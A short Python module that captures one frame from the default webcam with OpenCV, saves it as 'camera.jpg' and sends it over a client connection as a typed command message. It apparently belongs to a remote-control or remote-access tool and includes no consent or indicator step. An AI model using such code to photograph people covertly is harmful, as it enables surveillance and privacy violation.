import os
import time

import cv2

from core.Command import Command


class Camera(object):
    def __init__(self, command, client):
        self.__command = command
        self.__client = client
        self.__camera_file = 'camera.jpg'

    def shoot(self):
        cap = cv2.VideoCapture(0)
        time.sleep(1)
        ret, frame = cap.read()
        cv2.imwrite(self.__camera_file, frame)
        cap.release()
        self.send()

    def send(self):
        command = Command()
        command.set_type(3)
        command.set_data_length(os.path.getsize(self.__camera_file))
        with open(self.__camera_file, 'rb') as f:
            command.set_data(f.read())
        self.__client.send_command(command)
